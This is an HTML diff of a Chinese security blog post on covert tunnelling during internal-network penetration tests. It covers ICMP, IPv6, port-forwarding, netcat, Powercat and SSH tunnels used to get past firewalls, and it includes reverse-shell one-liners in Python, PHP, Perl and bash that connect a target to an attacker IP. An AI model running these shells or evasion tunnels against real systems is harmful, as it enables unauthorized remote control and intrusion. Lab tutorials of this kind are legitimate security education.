@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="zh-cn" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="郁涛丶" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网渗透-隧道隐藏 
+      
+      
+      |
+    
+     郁涛丶&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Ghostasky</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网渗透-隧道隐藏</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2022-02-10	  
+        </span>
+		
+		 <span class="post-pubtime"> 本文共2.1k字 </span>
+
+                                                                        <span class="post-pubtime">
+        大约需要11min
+      </span>
+		
+		
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Technology/" title="Technology">
+                    <b>#</b> Technology
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>[toc]</p>
+<h1 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h1><p>当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。</p>
+<p>在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。</p>
+<p>但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置的限制，它们会对主机间或者内网与外网之间通信的流量进行检测，如果存在异常就会进行拦截，这无疑给内网渗透增加了难度，而隐藏通信隧道技术就是为了绕过各种边界设备的封锁，从而完成主机间或内网与外网之间的通信。</p>
+<h1 id="常见隧道"><a href="#常见隧道" class="headerlink" title="常见隧道"></a>常见隧道</h1><p>网络层：IPV6隧道、ICMP隧道</p>
+<p>传输层：TCP隧道、UDP隧道、端口转发</p>
+<p>应用层：SSH隧道、HTTP(S)隧道、DNS隧道</p>
+<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="1-IPV6隧道"><a href="#1-IPV6隧道" class="headerlink" title="1.IPV6隧道"></a>1.IPV6隧道</h3><blockquote>
+<p>  工具：6tunnel（kali自带）</p>
+<p>  靶机：winserver2008</p>
+<p>  攻击机：kali</p>
+</blockquote>
+<p>首先要开启靶机的IPV6</p>
+<p><img src="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png" alt="image-20220210134112319"></p>
+<p>之后查看靶机的ipv6地址，假设为aaaa:bbbb:cccc:dddd</p>
+<p>在kali：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">6tunnel -4 80 aaaa:bbbb:cccc:dddd%eth080</span><br><span class="line"><span class="comment">#将靶机的80端口（ipv6）转发到本地的80端口（ipv4）</span></span><br></pre></td></tr></table></figure>
+
+<p>之后访问本地的80端口就可访问目标机的服务</p>
+<h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><p>一般通信都需要端口的开启，ICMP则不需要开放任何端口。</p>
+<p>渗透测试中，如果防火墙对各种上层协议(HTTP.HTTPS,DNS等)的数据包进行了封锁，那么我们可以尝试一下网管常常漏掉的ICMP协议包，我们可以将TCP数据包封装到ICMP数据包中，如果防火墙不对ICMP包进行拦截，那么我们便可以实现对防火墙的突破</p>
+<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><blockquote>
+<p>  工具：icmpsh</p>
+<p>  download：<a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<p>  需要python的impacket类库：apt-get install python4-impacket</p>
+<p>  由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>之后跑run.sh脚本即可，输入靶机与攻击机IP后会给出要在靶机上运行的指令</p>
+<p>执行后即可回弹shell</p>
+<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>网络的拓扑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br></pre></td></tr></table></figure>
+
+<p>可访问web服务，但不能访问数据库服务器；web服务器只能通过icmp访问数据库服务器。</p>
+<blockquote>
+<p>  工具：pingtunnel</p>
+<p>  make &amp;make install</p>
+</blockquote>
+<p>在web服务器上也要装，之后<code>ptunnel -x aaa</code>(在web服务器上开启一个密码为aaa的icmp隧道)</p>
+<p>在攻击机上：<code>ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x aaa</code></p>
+<p>(当访问攻击机的1080端口时，数据库服务器3389端口的数据便会以web服务器为中转，通过刚刚搭建好的以aaa为密码的ICMP隧道传送到攻击机的1080端口上)</p>
+<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h4 id="1-端口转发"><a href="#1-端口转发" class="headerlink" title="1.端口转发"></a>1.端口转发</h4><blockquote>
+<p>  工具：lcx</p>
+<p>  download：<a target="_blank" rel="noopener" href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p>
+</blockquote>
+<p>lcx的原理就是搭建Socket隧道，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接</p>
+<blockquote>
+<p>  攻击机：192.168.1.2</p>
+</blockquote>
+<p>在靶机上：<code>lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389</code></p>
+<p>(将本机的3389端口转发到攻击机的4444端口)</p>
+<p>在攻击机上：<code>./portmap -m 2 -p1 4444 -h2 192.168.1.2 -p2 5555</code></p>
+<p>（将本地的4444端口接收的数据转发到5555端口）</p>
+<p>然后访问本机的5555端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali下可：rdesktop &quot;127.0.0.1:5555&quot;</span><br><span class="line">win下直接远程桌面链接：127.0.0.1:5555</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -<span class="built_in">help</span></span><br><span class="line">-p 指定端口</span><br><span class="line">-v 显示细节</span><br><span class="line">-u 使用UDP传输协议</span><br><span class="line">-l 监听模式</span><br><span class="line">-w 设置超时时间</span><br></pre></td></tr></table></figure>
+
+<h5 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h5><p><strong>正向shell</strong></p>
+<p>正向连接使用频率较少，因为这种shell很容易被各种边界设备所拦截</p>
+<p>靶机中：<code>nc -lvp 4444 -e /bin/sh</code>（把/bin/sh发送给请求本机4444端口的中断）</p>
+<p>攻击机上：<code>nc 192.168.1.2 4444</code></p>
+<p><strong>反向shell</strong></p>
+<p>受害及主动来连接攻击机，这种方法在渗透测试中更为常用，因为它可以突破许多边界设备的封锁</p>
+<p>攻击机上：<code>nc -lvp 5555</code></p>
+<p>靶机上：    <code>nc 192.168.1.4 5555 -e /bin/sh</code></p>
+<p>这是在靶机上已经装了nc攻击，若没装的话，可使用其他来反弹shell：</p>
+<h6 id="1-用pyhton反弹shell"><a href="#1-用pyhton反弹shell" class="headerlink" title="1.用pyhton反弹shell"></a>1.用pyhton反弹shell</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机IP&quot;,攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="2-php反弹shell"><a href="#2-php反弹shell" class="headerlink" title="2.php反弹shell"></a>2.php反弹shell</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听的端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="3-perl反弹shell"><a href="#3-perl反弹shell" class="headerlink" title="3.perl反弹shell"></a>3.perl反弹shell</h6><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="4-bash反弹shell"><a href="#4-bash反弹shell" class="headerlink" title="4.bash反弹shell"></a>4.bash反弹shell</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4(攻击机ip)/6666 0&gt;&amp;1</span><br><span class="line">将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-Powercat"><a href="#3-Powercat" class="headerlink" title="3.Powercat"></a>3.Powercat</h4><blockquote>
+<p>  download：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
+</blockquote>
+<p>工具下载后需要导入powercat.ps1脚本后才可以正常使用powercat</p>
+<p>执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1</span><br></pre></td></tr></table></figure>
+
+<p>如果权限不够需要修改权限：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure>
+
+<p>部分参数：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c 指定一个ip地址</span><br><span class="line">-p 指定一个端口</span><br><span class="line">-v 显示详情</span><br><span class="line">-l 监听模式</span><br><span class="line">-e 程序重定向</span><br></pre></td></tr></table></figure>
+
+<h3 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br><span class="line"><span class="comment">#这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击机：</p>
+<p><code>nc 192.168.1.2 8888 -vv</code></p>
+<h3 id="反向链接"><a href="#反向链接" class="headerlink" title="反向链接"></a>反向链接</h3><p>攻击机先监听本机5555端口<code>nc -lpvv 5555</code></p>
+<p>靶机：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-p</span> <span class="number">5555</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1.ssh"></a>1.ssh</h3><p>常见参数：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台执行SSH</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发</span><br><span class="line">-P 指定SSH端口</span><br></pre></td></tr></table></figure>
+
+<p>网络拓扑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br><span class="line"></span><br><span class="line">实验环境：攻击机无法访问数据库服务器，可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问</span><br><span class="line"></span><br><span class="line">实验目标：通过本地端口转发，访问攻击机本地的5555端口便可以打开数据库服务器的远程桌面</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-本地转发"><a href="#1-本地转发" class="headerlink" title="1.本地转发"></a>1.本地转发</h4><p>在攻击机上：</p>
+<p><code>ssh -CfNg -L 5555:192.168.1.2:3389 root@192.168.1.5</code>(这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机)</p>
+<p>之后会输入web服务器的密码，由于是静默模式，可以本地查看5555端口是否被监听来检查通道的建立是否正常</p>
+<p><code>netstat -tulnp | grep &quot;5555&quot;</code></p>
+<p>接下来攻击机访问本机5555端口即可打开数据库的远程桌面：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-远程转发"><a href="#2-远程转发" class="headerlink" title="2.远程转发"></a>2.远程转发</h4><p>在web服务器上：</p>
+<p><code>ssh -CfNg -R 5555:192.168.1.2:3389 root@192.168.1.4</code>（这条命令的意思是此时的web服务器虽然依旧是跳板，但是无论是连接数据库服务器的3389还是去连接攻击机的5555都是web服务器主动发起）</p>
+<p>之后输入攻击机的密码，在攻击机访问本地的5555端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-动态转发"><a href="#3-动态转发" class="headerlink" title="3.动态转发"></a>3.动态转发</h4><p>在攻击机上：</p>
+<p><code>ssh -CfNg -D 6000 root@192.168.1.5</code>（搭建了一个动态的SOCKS代理通道）</p>
+<p>之后输入web服务器的密码，查看是否链接成功<code>netstat -tulnp | grep &quot;:6000&quot;</code></p>
+<p>然后在本地浏览器设置好socks代理就可访问数据服务器上开放的web服务</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/02/05/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2022-02-10 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Technology/" title="Technology">
+                        <b>#</b> Technology
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/02/16/VulnHub01/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-text">隐藏通信隧道技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93"><span class="toc-text">常见隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82"><span class="toc-text">网络层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-IPV6%E9%9A%A7%E9%81%93"><span class="toc-text">1.IPV6隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ICMP%E9%9A%A7%E9%81%93"><span class="toc-text">2.ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#icmpsh"><span class="toc-text">icmpsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pingtunnel"><span class="toc-text">pingtunnel</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82"><span class="toc-text">传输层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">1.端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-netcat"><span class="toc-text">2.netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="toc-text">获得shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E7%94%A8pyhton%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.用pyhton反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-php%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">2.php反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-perl%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3.perl反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">4.bash反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Powercat"><span class="toc-text">3.Powercat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-text">正向链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-text">反向链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-text">应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ssh"><span class="toc-text">1.ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-text">1.本地转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-text">2.远程转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-text">3.动态转发</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Ghostasky">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ghostasky">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/Ghostasky">怕什么真理无穷，进一寸有进一寸的欢喜。</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
